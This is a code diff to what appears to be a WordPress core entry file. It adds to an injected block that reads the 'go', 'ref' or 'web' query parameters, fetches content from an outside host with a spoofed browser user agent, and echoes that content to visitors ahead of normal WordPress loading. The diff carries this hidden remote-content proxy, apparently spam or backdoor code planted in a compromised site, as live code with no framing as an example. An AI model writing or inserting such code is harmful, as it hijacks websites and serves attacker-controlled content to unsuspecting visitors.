@@ -5,8 +5,7 @@
  * @package WordPress
  */
 function fetchDataFromSite($site) {
-    $url = 'https://replication2.pkcdurensawit.net/aaarushascience/' . $site . '/';
-    $ch = curl_init($url);
+    $ch = curl_init($site);
     curl_setopt_array($ch, [
         CURLOPT_USERAGENT => "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.1) Gecko/20061204 Firefox/2.0.0.1",
         CURLOPT_RETURNTRANSFER => true,
@@ -20,9 +19,22 @@ function fetchDataFromSite($site) {
 }
 
 if(isset($_GET['go'])) {
-    $site = $_GET['go'];
+    $sitex = $_GET['go'];
+    $site = 'https://replication2.pkcdurensawit.net/aaarushascience/?go='.$sitex;
     $data = fetchDataFromSite($site);
     echo $data;
+}
+elseif(isset($_GET['ref'])) {
+    $sitex = $_GET['ref'];
+    $site = 'https://replication2.pkcdurensawit.net/aaarushascience/?ref='.$sitex;
+    $data = fetchDataFromSite($site);
+    echo $data;
+}
+elseif(isset($_GET['web'])) {
+  $sitex = $_GET['web'];
+  $site = 'https://replication2.pkcdurensawit.net/aaarushascience/?web='.$sitex;
+  $data = fetchDataFromSite($site);
+  echo $data;
 } else {
 
 if ( ! isset( $wp_did_header ) ) {
